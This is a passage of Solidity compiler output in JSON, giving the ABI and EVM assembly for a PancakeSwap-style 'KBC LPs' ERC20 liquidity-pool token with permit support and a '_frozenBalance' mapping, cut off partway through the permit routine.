{
	"ERC20.sol": {
		"ERC20": {
			"abi": [
				{
					"inputs": [],
					"payable": false,
					"stateMutability": "nonpayable",
					"type": "constructor"
				},
				{
					"anonymous": false,
					"inputs": [
						{
							"indexed": true,
							"internalType": "address",
							"name": "owner",
							"type": "address"
						},
						{
							"indexed": true,
							"internalType": "address",
							"name": "spender",
							"type": "address"
						},
						{
							"indexed": false,
							"internalType": "uint256",
							"name": "value",
							"type": "uint256"
						}
					],
					"name": "Approval",
					"type": "event"
				},
				{
					"anonymous": false,
					"inputs": [
						{
							"indexed": true,
							"internalType": "address",
							"name": "from",
							"type": "address"
						},
						{
							"indexed": true,
							"internalType": "address",
							"name": "to",
							"type": "address"
						},
						{
							"indexed": false,
							"internalType": "uint256",
							"name": "value",
							"type": "uint256"
						}
					],
					"name": "Transfer",
					"type": "event"
				},
				{
					"constant": true,
					"inputs": [],
					"name": "DOMAIN_SEPARATOR",
					"outputs": [
						{
							"internalType": "bytes32",
							"name": "",
							"type": "bytes32"
						}
					],
					"payable": false,
					"stateMutability": "view",
					"type": "function"
				},
				{
					"constant": true,
					"inputs": [],
					"name": "PERMIT_TYPEHASH",
					"outputs": [
						{
							"internalType": "bytes32",
							"name": "",
							"type": "bytes32"
						}
					],
					"payable": false,
					"stateMutability": "view",
					"type": "function"
				},
				{
					"constant": true,
					"inputs": [
						{
							"internalType": "address",
							"name": "",
							"type": "address"
						}
					],
					"name": "_frozenBalance",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"payable": false,
					"stateMutability": "view",
					"type": "function"
				},
				{
					"constant": true,
					"inputs": [
						{
							"internalType": "address",
							"name": "",
							"type": "address"
						},
						{
							"internalType": "address",
							"name": "",
							"type": "address"
						}
					],
					"name": "allowance",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"payable": false,
					"stateMutability": "view",
					"type": "function"
				},
				{
					"constant": false,
					"inputs": [
						{
							"internalType": "address",
							"name": "spender",
							"type": "address"
						},
						{
							"internalType": "uint256",
							"name": "value",
							"type": "uint256"
						}
					],
					"name": "approve",
					"outputs": [
						{
							"internalType": "bool",
							"name": "",
							"type": "bool"
						}
					],
					"payable": false,
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"constant": true,
					"inputs": [
						{
							"internalType": "address",
							"name": "",
							"type": "address"
						}
					],
					"name": "balanceOf",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"payable": false,
					"stateMutability": "view",
					"type": "function"
				},
				{
					"constant": true,
					"inputs": [],
					"name": "decimals",
					"outputs": [
						{
							"internalType": "uint8",
							"name": "",
							"type": "uint8"
						}
					],
					"payable": false,
					"stateMutability": "view",
					"type": "function"
				},
				{
					"constant": true,
					"inputs": [],
					"name": "name",
					"outputs": [
						{
							"internalType": "string",
							"name": "",
							"type": "string"
						}
					],
					"payable": false,
					"stateMutability": "view",
					"type": "function"
				},
				{
					"constant": true,
					"inputs": [
						{
							"internalType": "address",
							"name": "",
							"type": "address"
						}
					],
					"name": "nonces",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"payable": false,
					"stateMutability": "view",
					"type": "function"
				},
				{
					"constant": false,
					"inputs": [
						{
							"internalType": "address",
							"name": "owner",
							"type": "address"
						},
						{
							"internalType": "address",
							"name": "spender",
							"type": "address"
						},
						{
							"internalType": "uint256",
							"name": "value",
							"type": "uint256"
						},
						{
							"internalType": "uint256",
							"name": "deadline",
							"type": "uint256"
						},
						{
							"internalType": "uint8",
							"name": "v",
							"type": "uint8"
						},
						{
							"internalType": "bytes32",
							"name": "r",
							"type": "bytes32"
						},
						{
							"internalType": "bytes32",
							"name": "s",
							"type": "bytes32"
						}
					],
					"name": "permit",
					"outputs": [],
					"payable": false,
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"constant": true,
					"inputs": [],
					"name": "symbol",
					"outputs": [
						{
							"internalType": "string",
							"name": "",
							"type": "string"
						}
					],
					"payable": false,
					"stateMutability": "view",
					"type": "function"
				},
				{
					"constant": true,
					"inputs": [],
					"name": "totalSupply",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"payable": false,
					"stateMutability": "view",
					"type": "function"
				},
				{
					"constant": false,
					"inputs": [
						{
							"internalType": "address",
							"name": "to",
							"type": "address"
						},
						{
							"internalType": "uint256",
							"name": "value",
							"type": "uint256"
						}
					],
					"name": "transfer",
					"outputs": [
						{
							"internalType": "bool",
							"name": "",
							"type": "bool"
						}
					],
					"payable": false,
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"constant": false,
					"inputs": [
						{
							"internalType": "address",
							"name": "from",
							"type": "address"
						},
						{
							"internalType": "address",
							"name": "to",
							"type": "address"
						},
						{
							"internalType": "uint256",
							"name": "value",
							"type": "uint256"
						}
					],
					"name": "transferFrom",
					"outputs": [
						{
							"internalType": "bool",
							"name": "",
							"type": "bool"
						}
					],
					"payable": false,
					"stateMutability": "nonpayable",
					"type": "function"
				}
			],
			"devdoc": {
				"methods": {}
			},
			"evm": {
				"assembly": "    /* \"ERC20.sol\":111:4441  contract ERC20 is IERC20 {... */\n  mstore(0x40, 0x80)\n    /* \"ERC20.sol\":1017:1502  constructor() public {... */\n  callvalue\n    /* \"--CODEGEN--\":8:17   */\n  dup1\n    /* \"--CODEGEN--\":5:7   */\n  iszero\n  tag_1\n  jumpi\n    /* \"--CODEGEN--\":30:31   */\n  0x00\n    /* \"--CODEGEN--\":27:28   */\n  dup1\n    /* \"--CODEGEN--\":20:32   */\n  revert\n    /* \"--CODEGEN--\":5:7   */\ntag_1:\n  pop\n    /* \"ERC20.sol\":1203:1336  keccak256(... */\n  mload(0x40)\n    /* \"ERC20.sol\":1107:1114  chainid */\n  chainid\n  swap1\n    /* \"ERC20.sol\":1203:1336  keccak256(... */\n  dup1\n  0x52\n  data_8b73c3c69bb8fe3d512ecc4cf759cc79239f7b179b0ffacaa9a75d522b39400f\n  dup3\n  codecopy\n  0x40\n  dup1\n  mload\n  swap2\n  dup3\n  swap1\n  sub\n  0x52\n  add\n  dup3\n  keccak256\n    /* \"ERC20.sol\":1370:1374  name */\n  dup3\n  dup3\n  add\n  dup3\n  mstore\n  0x07\n  dup4\n  mstore\n  shl(0xc8, 0x4b4243204c5073)\n  0x20\n  swap4\n  dup5\n  add\n  mstore\n    /* \"ERC20.sol\":1404:1414  bytes(\"1\") */\n  dup2\n  mload\n  dup1\n  dup4\n  add\n  dup4\n  mstore\n  0x01\n  dup2\n  mstore\n  shl(0xf8, 0x31)\n  swap1\n  dup5\n  add\n  mstore\n    /* \"ERC20.sol\":1175:1485  abi.encode(... */\n  dup2\n  mload\n  dup1\n  dup5\n  add\n  swap2\n  swap1\n  swap2\n  mstore\n    /* \"ERC20.sol\":1354:1376  keccak256(bytes(name)) */\n  0x6a36d39f32c2225411d16c8f56813b9117e6eb8bf3d2893c5fc62411565cfcfe\n    /* \"ERC20.sol\":1175:1485  abi.encode(... */\n  dup2\n  dup4\n  add\n  mstore\n    /* \"ERC20.sol\":1394:1415  keccak256(bytes(\"1\")) */\n  0xc89efdaa54c0f20c7adf612882df0950f5a951637e0307cdcb4c672f298b8bc6\n    /* \"ERC20.sol\":1175:1485  abi.encode(... */\n  0x60\n  dup3\n  add\n  mstore\n  0x80\n  dup2\n  add\n  swap5\n  swap1\n  swap5\n  mstore\n    /* \"ERC20.sol\":1466:1470  this */\n  address\n    /* \"ERC20.sol\":1175:1485  abi.encode(... */\n  0xa0\n  dup1\n  dup7\n  add\n  swap2\n  swap1\n  swap2\n  mstore\n  dup2\n  mload\n    /* \"--CODEGEN--\":26:47   */\n  dup1\n  dup7\n  sub\n    /* \"--CODEGEN--\":22:54   */\n  swap1\n  swap2\n  add\n    /* \"--CODEGEN--\":6:55   */\n  dup2\n  mstore\n    /* \"ERC20.sol\":1175:1485  abi.encode(... */\n  0xc0\n  swap1\n  swap5\n  add\n  swap1\n  mstore\n    /* \"ERC20.sol\":1152:1495  keccak256(... */\n  dup3\n  mload\n  swap3\n  add\n  swap2\n  swap1\n  swap2\n  keccak256\n    /* \"ERC20.sol\":1133:1149  DOMAIN_SEPARATOR */\n  0x04\n    /* \"ERC20.sol\":1133:1495  DOMAIN_SEPARATOR = keccak256(... */\n  sstore\n  pop\n    /* \"ERC20.sol\":111:4441  contract ERC20 is IERC20 {... */\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\ndata_8b73c3c69bb8fe3d512ecc4cf759cc79239f7b179b0ffacaa9a75d522b39400f 454950373132446f6d61696e28737472696e67206e616d652c737472696e672076657273696f6e2c75696e7432353620636861696e49642c6164647265737320766572696679696e67436f6e747261637429\n\nsub_0: assembly {\n        /* \"ERC20.sol\":111:4441  contract ERC20 is IERC20 {... */\n      mstore(0x40, 0x80)\n      callvalue\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_1\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_1:\n        /* \"ERC20.sol\":111:4441  contract ERC20 is IERC20 {... */\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x47d5d856\n      gt\n      tag_17\n      jumpi\n      dup1\n      0x95d89b41\n      gt\n      tag_18\n      jumpi\n      dup1\n      0x95d89b41\n      eq\n      tag_13\n      jumpi\n      dup1\n      0xa9059cbb\n      eq\n      tag_14\n      jumpi\n      dup1\n      0xd505accf\n      eq\n      tag_15\n      jumpi\n      dup1\n      0xdd62ed3e\n      eq\n      tag_16\n      jumpi\n      jump(tag_2)\n    tag_18:\n      dup1\n      0x47d5d856\n      eq\n      tag_10\n      jumpi\n      dup1\n      0x70a08231\n      eq\n      tag_11\n      jumpi\n      dup1\n      0x7ecebe00\n      eq\n      tag_12\n      jumpi\n      jump(tag_2)\n    tag_17:\n      dup1\n      0x23b872dd\n      gt\n      tag_19\n      jumpi\n      dup1\n      0x23b872dd\n      eq\n      tag_6\n      jumpi\n      dup1\n      0x30adf81f\n      eq\n      tag_7\n      jumpi\n      dup1\n      0x313ce567\n      eq\n      tag_8\n      jumpi\n      dup1\n      0x3644e515\n      eq\n      tag_9\n      jumpi\n      jump(tag_2)\n    tag_19:\n      dup1\n      0x06fdde03\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x095ea7b3\n      eq\n      tag_4\n      jumpi\n      dup1\n      0x18160ddd\n      eq\n      tag_5\n      jumpi\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"ERC20.sol\":175:214  string public constant name = \"KBC LPs\" */\n    tag_3:\n      tag_20\n      tag_21\n      jump\t// in\n    tag_20:\n      0x40\n      dup1\n      mload\n      0x20\n      dup1\n      dup3\n      mstore\n      dup4\n      mload\n      dup2\n      dup4\n      add\n      mstore\n      dup4\n      mload\n      swap2\n      swap3\n      dup4\n      swap3\n      swap1\n      dup4\n      add\n      swap2\n      dup6\n      add\n      swap1\n      dup1\n      dup4\n      dup4\n      0x00\n        /* \"--CODEGEN--\":8:108   */\n    tag_22:\n        /* \"--CODEGEN--\":33:36   */\n      dup4\n        /* \"--CODEGEN--\":30:31   */\n      dup2\n        /* \"--CODEGEN--\":27:37   */\n      lt\n        /* \"--CODEGEN--\":8:108   */\n      iszero\n      tag_24\n      jumpi\n        /* \"--CODEGEN--\":90:101   */\n      dup2\n      dup2\n      add\n        /* \"--CODEGEN--\":84:102   */\n      mload\n        /* \"--CODEGEN--\":71:82   */\n      dup4\n      dup3\n      add\n        /* \"--CODEGEN--\":64:103   */\n      mstore\n        /* \"--CODEGEN--\":52:54   */\n      0x20\n        /* \"--CODEGEN--\":45:55   */\n      add\n        /* \"--CODEGEN--\":8:108   */\n      jump(tag_22)\n    tag_24:\n        /* \"--CODEGEN--\":12:26   */\n      pop\n        /* \"ERC20.sol\":175:214  string public constant name = \"KBC LPs\" */\n      pop\n      pop\n      pop\n      swap1\n      pop\n      swap1\n      dup2\n      add\n      swap1\n      0x1f\n      and\n      dup1\n      iszero\n      tag_25\n      jumpi\n      dup1\n      dup3\n      sub\n      dup1\n      mload\n      0x01\n      dup4\n      0x20\n      sub\n      0x0100\n      exp\n      sub\n      not\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n    tag_25:\n      pop\n      swap3\n      pop\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"ERC20.sol\":2810:2957  function approve(address spender, uint256 value) external returns (bool) {... */\n    tag_4:\n      tag_26\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x40\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_27\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_27:\n      pop\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"ERC20.sol\":2810:2957  function approve(address spender, uint256 value) external returns (bool) {... */\n      dup2\n      calldataload\n      and\n      swap1\n      0x20\n      add\n      calldataload\n      tag_28\n      jump\t// in\n    tag_26:\n      0x40\n      dup1\n      mload\n      swap2\n      iszero\n      iszero\n      dup3\n      mstore\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x20\n      add\n      swap1\n      return\n        /* \"ERC20.sol\":307:333  uint256 public totalSupply */\n    tag_5:\n      tag_29\n      tag_30\n      jump\t// in\n    tag_29:\n      0x40\n      dup1\n      mload\n      swap2\n      dup3\n      mstore\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x20\n      add\n      swap1\n      return\n        /* \"ERC20.sol\":3108:3469  function transferFrom(... */\n    tag_6:\n      tag_26\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x60\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_32\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_32:\n      pop\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"ERC20.sol\":3108:3469  function transferFrom(... */\n      dup2\n      calldataload\n      dup2\n      and\n      swap2\n      0x20\n      dup2\n      add\n      calldataload\n      swap1\n      swap2\n      and\n      swap1\n      0x40\n      add\n      calldataload\n      tag_33\n      jump\t// in\n        /* \"ERC20.sol\":656:772  bytes32 public constant PERMIT_TYPEHASH =... */\n    tag_7:\n      tag_29\n      tag_35\n      jump\t// in\n        /* \"ERC20.sol\":266:301  uint8 public constant decimals = 18 */\n    tag_8:\n      tag_36\n      tag_37\n      jump\t// in\n    tag_36:\n      0x40\n      dup1\n      mload\n      0xff\n      swap1\n      swap3\n      and\n      dup3\n      mstore\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x20\n      add\n      swap1\n      return\n        /* \"ERC20.sol\":515:546  bytes32 public DOMAIN_SEPARATOR */\n    tag_9:\n      tag_29\n      tag_39\n      jump\t// in\n        /* \"ERC20.sol\":459:508  mapping(address => uint256) public _frozenBalance */\n    tag_10:\n      tag_29\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_41\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_41:\n      pop\n        /* \"ERC20.sol\":459:508  mapping(address => uint256) public _frozenBalance */\n      calldataload\n      sub(shl(0xa0, 0x01), 0x01)\n      and\n      tag_42\n      jump\t// in\n        /* \"ERC20.sol\":339:383  mapping(address => uint256) public balanceOf */\n    tag_11:\n      tag_29\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_44\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_44:\n      pop\n        /* \"ERC20.sol\":339:383  mapping(address => uint256) public balanceOf */\n      calldataload\n      sub(shl(0xa0, 0x01), 0x01)\n      and\n      tag_45\n      jump\t// in\n        /* \"ERC20.sol\":778:819  mapping(address => uint256) public nonces */\n    tag_12:\n      tag_29\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_47\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_47:\n      pop\n        /* \"ERC20.sol\":778:819  mapping(address => uint256) public nonces */\n      calldataload\n      sub(shl(0xa0, 0x01), 0x01)\n      and\n      tag_48\n      jump\t// in\n        /* \"ERC20.sol\":220:260  string public constant symbol = \"KBC-LP\" */\n    tag_13:\n      tag_20\n      tag_50\n      jump\t// in\n        /* \"ERC20.sol\":2963:3102  function transfer(address to, uint256 value) external returns (bool) {... */\n    tag_14:\n      tag_26\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x40\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_56\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_56:\n      pop\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"ERC20.sol\":2963:3102  function transfer(address to, uint256 value) external returns (bool) {... */\n      dup2\n      calldataload\n      and\n      swap1\n      0x20\n      add\n      calldataload\n      tag_57\n      jump\t// in\n        /* \"ERC20.sol\":3475:4439  function permit(... */\n    tag_15:\n      tag_58\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:16   */\n      0xe0\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:17   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_59\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_59:\n      pop\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"ERC20.sol\":3475:4439  function permit(... */\n      dup2\n      calldataload\n      dup2\n      and\n      swap2\n      0x20\n      dup2\n      add\n      calldataload\n      swap1\n      swap2\n      and\n      swap1\n      0x40\n      dup2\n      add\n      calldataload\n      swap1\n      0x60\n      dup2\n      add\n      calldataload\n      swap1\n      0xff\n      0x80\n      dup3\n      add\n      calldataload\n      and\n      swap1\n      0xa0\n      dup2\n      add\n      calldataload\n      swap1\n      0xc0\n      add\n      calldataload\n      tag_60\n      jump\t// in\n    tag_58:\n      stop\n        /* \"ERC20.sol\":389:453  mapping(address => mapping(address => uint256)) public allowance */\n    tag_16:\n      tag_29\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x40\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_62\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_62:\n      pop\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"ERC20.sol\":389:453  mapping(address => mapping(address => uint256)) public allowance */\n      dup2\n      calldataload\n      dup2\n      and\n      swap2\n      0x20\n      add\n      calldataload\n      and\n      tag_63\n      jump\t// in\n        /* \"ERC20.sol\":175:214  string public constant name = \"KBC LPs\" */\n    tag_21:\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x07\n      dup2\n      mstore\n      0x20\n      add\n      shl(0xc8, 0x4b4243204c5073)\n      dup2\n      mstore\n      pop\n      dup2\n      jump\t// out\n        /* \"ERC20.sol\":2810:2957  function approve(address spender, uint256 value) external returns (bool) {... */\n    tag_28:\n        /* \"ERC20.sol\":2877:2881  bool */\n      0x00\n        /* \"ERC20.sol\":2893:2929  _approve(msg.sender, spender, value) */\n      tag_65\n        /* \"ERC20.sol\":2902:2912  msg.sender */\n      caller\n        /* \"ERC20.sol\":2914:2921  spender */\n      dup5\n        /* \"ERC20.sol\":2923:2928  value */\n      dup5\n        /* \"ERC20.sol\":2893:2901  _approve */\n      tag_66\n        /* \"ERC20.sol\":2893:2929  _approve(msg.sender, spender, value) */\n      jump\t// in\n    tag_65:\n      pop\n        /* \"ERC20.sol\":2946:2950  true */\n      0x01\n        /* \"ERC20.sol\":2810:2957  function approve(address spender, uint256 value) external returns (bool) {... */\n    tag_64:\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"ERC20.sol\":307:333  uint256 public totalSupply */\n    tag_30:\n      sload(0x00)\n      dup2\n      jump\t// out\n        /* \"ERC20.sol\":3108:3469  function transferFrom(... */\n    tag_33:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"ERC20.sol\":3239:3254  allowance[from] */\n      dup4\n      and\n        /* \"ERC20.sol\":3219:3223  bool */\n      0x00\n        /* \"ERC20.sol\":3239:3254  allowance[from] */\n      swap1\n      dup2\n      mstore\n        /* \"ERC20.sol\":3239:3248  allowance */\n      0x02\n        /* \"ERC20.sol\":3239:3254  allowance[from] */\n      0x20\n      swap1\n      dup2\n      mstore\n      0x40\n      dup1\n      dup4\n      keccak256\n        /* \"ERC20.sol\":3255:3265  msg.sender */\n      caller\n        /* \"ERC20.sol\":3239:3266  allowance[from][msg.sender] */\n      dup5\n      mstore\n      swap1\n      swap2\n      mstore\n      dup2\n      keccak256\n      sload\n      not(0x00)\n        /* \"ERC20.sol\":3239:3281  allowance[from][msg.sender] != uint256(-1) */\n      eq\n        /* \"ERC20.sol\":3235:3406  if (allowance[from][msg.sender] != uint256(-1)) {... */\n      tag_68\n      jumpi\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"ERC20.sol\":3327:3342  allowance[from] */\n      dup5\n      and\n      0x00\n      swap1\n      dup2\n      mstore\n        /* \"ERC20.sol\":3327:3336  allowance */\n      0x02\n        /* \"ERC20.sol\":3327:3342  allowance[from] */\n      0x20\n      swap1\n      dup2\n      mstore\n      0x40\n      dup1\n      dup4\n      keccak256\n        /* \"ERC20.sol\":3343:3353  msg.sender */\n      caller\n        /* \"ERC20.sol\":3327:3354  allowance[from][msg.sender] */\n      dup5\n      mstore\n      swap1\n      swap2\n      mstore\n      swap1\n      keccak256\n      sload\n        /* \"ERC20.sol\":3327:3395  allowance[from][msg.sender].sub(... */\n      tag_69\n      swap1\n        /* \"ERC20.sol\":3376:3381  value */\n      dup4\n        /* \"ERC20.sol\":3327:3395  allowance[from][msg.sender].sub(... */\n      0xffffffff\n        /* \"ERC20.sol\":3327:3358  allowance[from][msg.sender].sub */\n      tag_70\n        /* \"ERC20.sol\":3327:3395  allowance[from][msg.sender].sub(... */\n      and\n      jump\t// in\n    tag_69:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"ERC20.sol\":3297:3312  allowance[from] */\n      dup6\n      and\n      0x00\n      swap1\n      dup2\n      mstore\n        /* \"ERC20.sol\":3297:3306  allowance */\n      0x02\n        /* \"ERC20.sol\":3297:3312  allowance[from] */\n      0x20\n      swap1\n      dup2\n      mstore\n      0x40\n      dup1\n      dup4\n      keccak256\n        /* \"ERC20.sol\":3313:3323  msg.sender */\n      caller\n        /* \"ERC20.sol\":3297:3324  allowance[from][msg.sender] */\n      dup5\n      mstore\n      swap1\n      swap2\n      mstore\n      swap1\n      keccak256\n        /* \"ERC20.sol\":3297:3395  allowance[from][msg.sender] = allowance[from][msg.sender].sub(... */\n      sstore\n        /* \"ERC20.sol\":3235:3406  if (allowance[from][msg.sender] != uint256(-1)) {... */\n    tag_68:\n        /* \"ERC20.sol\":3415:3441  _transfer(from, to, value) */\n      tag_71\n        /* \"ERC20.sol\":3425:3429  from */\n      dup5\n        /* \"ERC20.sol\":3431:3433  to */\n      dup5\n        /* \"ERC20.sol\":3435:3440  value */\n      dup5\n        /* \"ERC20.sol\":3415:3424  _transfer */\n      tag_72\n        /* \"ERC20.sol\":3415:3441  _transfer(from, to, value) */\n      jump\t// in\n    tag_71:\n      pop\n        /* \"ERC20.sol\":3458:3462  true */\n      0x01\n        /* \"ERC20.sol\":3108:3469  function transferFrom(... */\n      swap4\n      swap3\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"ERC20.sol\":656:772  bytes32 public constant PERMIT_TYPEHASH =... */\n    tag_35:\n        /* \"ERC20.sol\":706:772  0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9 */\n      0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9\n        /* \"ERC20.sol\":656:772  bytes32 public constant PERMIT_TYPEHASH =... */\n      dup2\n      jump\t// out\n        /* \"ERC20.sol\":266:301  uint8 public constant decimals = 18 */\n    tag_37:\n        /* \"ERC20.sol\":299:301  18 */\n      0x12\n        /* \"ERC20.sol\":266:301  uint8 public constant decimals = 18 */\n      dup2\n      jump\t// out\n        /* \"ERC20.sol\":515:546  bytes32 public DOMAIN_SEPARATOR */\n    tag_39:\n      sload(0x04)\n      dup2\n      jump\t// out\n        /* \"ERC20.sol\":459:508  mapping(address => uint256) public _frozenBalance */\n    tag_42:\n      mstore(0x20, 0x03)\n      0x00\n      swap1\n      dup2\n      mstore\n      0x40\n      swap1\n      keccak256\n      sload\n      dup2\n      jump\t// out\n        /* \"ERC20.sol\":339:383  mapping(address => uint256) public balanceOf */\n    tag_45:\n      mstore(0x20, 0x01)\n      0x00\n      swap1\n      dup2\n      mstore\n      0x40\n      swap1\n      keccak256\n      sload\n      dup2\n      jump\t// out\n        /* \"ERC20.sol\":778:819  mapping(address => uint256) public nonces */\n    tag_48:\n      mstore(0x20, 0x05)\n      0x00\n      swap1\n      dup2\n      mstore\n      0x40\n      swap1\n      keccak256\n      sload\n      dup2\n      jump\t// out\n        /* \"ERC20.sol\":220:260  string public constant symbol = \"KBC-LP\" */\n    tag_50:\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x06\n      dup2\n      mstore\n      0x20\n      add\n      shl(0xd4, 0x04b42432d4c5)\n      dup2\n      mstore\n      pop\n      dup2\n      jump\t// out\n        /* \"ERC20.sol\":2963:3102  function transfer(address to, uint256 value) external returns (bool) {... */\n    tag_57:\n        /* \"ERC20.sol\":3026:3030  bool */\n      0x00\n        /* \"ERC20.sol\":3042:3074  _transfer(msg.sender, to, value) */\n      tag_65\n        /* \"ERC20.sol\":3052:3062  msg.sender */\n      caller\n        /* \"ERC20.sol\":3064:3066  to */\n      dup5\n        /* \"ERC20.sol\":3068:3073  value */\n      dup5\n        /* \"ERC20.sol\":3042:3051  _transfer */\n      tag_72\n        /* \"ERC20.sol\":3042:3074  _transfer(msg.sender, to, value) */\n      jump\t// in\n        /* \"ERC20.sol\":3475:4439  function permit(... */\n    tag_60:\n        /* \"ERC20.sol\":3688:3703  block.timestamp */\n      timestamp\n        /* \"ERC20.sol\":3676:3684  deadline */\n      dup5\n        /* \"ERC20.sol\":3676:3703  deadline >= block.timestamp */\n      lt\n      iszero\n        /* \"ERC20.sol\":3668:3724  require(deadline >= block.timestamp, \"Pancake: EXPIRED\") */\n      tag_76\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x10\n      0x24\n      dup3\n      add\n      mstore\n      shl(0x82, 0x14185b98d85ad94e8811561412549151)\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n    tag_76:\n        /* \"ERC20.sol\":3836:3852  DOMAIN_SEPARATOR */\n      sload(0x04)\n      